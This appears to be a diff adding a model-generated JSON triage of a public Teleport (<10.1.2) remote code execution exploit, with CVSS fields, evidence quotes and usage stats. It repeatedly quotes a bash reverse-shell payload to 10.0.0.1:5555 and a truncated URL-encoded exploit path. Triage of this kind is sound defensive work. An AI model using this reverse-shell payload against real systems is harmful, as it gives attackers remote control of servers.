@@ -1,0 +1,69 @@
+{
+  "proposal": {
+    "is_vulnerability_report": true,
+    "summary": "Public exploit for Teleport before 10.1.2 demonstrates remote code execution via a crafted request that results in execution of a shell payload.",
+    "affected_product": "Teleport < 10.1.2",
+    "cwe": "CWE-94",
+    "cwe_quote": "\"/bin/bash -l > /dev/tcp/10.0.0.1/5555 0<&1 2>&1 #",
+    "cvss": {
+      "AV": {
+        "value": "N",
+        "quote": "Proof of Concept (payload):\nhttps://teleport.site.com/scripts/%22%0a%2f%62%69%6e%2="
+      },
+      "AC": {
+        "value": "L",
+        "quote": ""
+      },
+      "PR": {
+        "value": "N",
+        "quote": ""
+      },
+      "UI": {
+        "value": "N",
+        "quote": ""
+      },
+      "S": {
+        "value": "U",
+        "quote": ""
+      },
+      "C": {
+        "value": "H",
+        "quote": "\"/bin/bash -l > /dev/tcp/10.0.0.1/5555 0<&1 2>&1 #"
+      },
+      "I": {
+        "value": "H",
+        "quote": "\"/bin/bash -l > /dev/tcp/10.0.0.1/5555 0<&1 2>&1 #"
+      },
+      "A": {
+        "value": "H",
+        "quote": "\"/bin/bash -l > /dev/tcp/10.0.0.1/5555 0<&1 2>&1 #"
+      }
+    },
+    "recommended_next_step": "Obtain and review the vulnerable request handling code and proof-of-concept to identify the injection vector and produce a patch, and notify users to upgrade to 10.1.2 or later.",
+    "confidence": "high",
+    "evidence_quotes": [
+      {
+        "claim": "Exploit title and affected version",
+        "quote": "Exploit Title: Teleport v10.1.1 - Remote Code Execution (RCE)"
+      },
+      {
+        "claim": "Version affected",
+        "quote": "Version: < 10.1.2"
+      },
+      {
+        "claim": "Proof of concept payload URL",
+        "quote": "Proof of Concept (payload):\nhttps://teleport.site.com/scripts/%22%0a%2f%62%69%6e%2="
+      },
+      {
+        "claim": "Decoded payload showing shell execution",
+        "quote": "\"\n\n/bin/bash -l > /dev/tcp/10.0.0.1/5555 0<&1 2>&1 #"
+      }
+    ]
+  },
+  "usage": {
+    "input_tokens": 1880,
+    "output_tokens": 654,
+    "latency_s": null,
+    "batch": true
+  }
+}
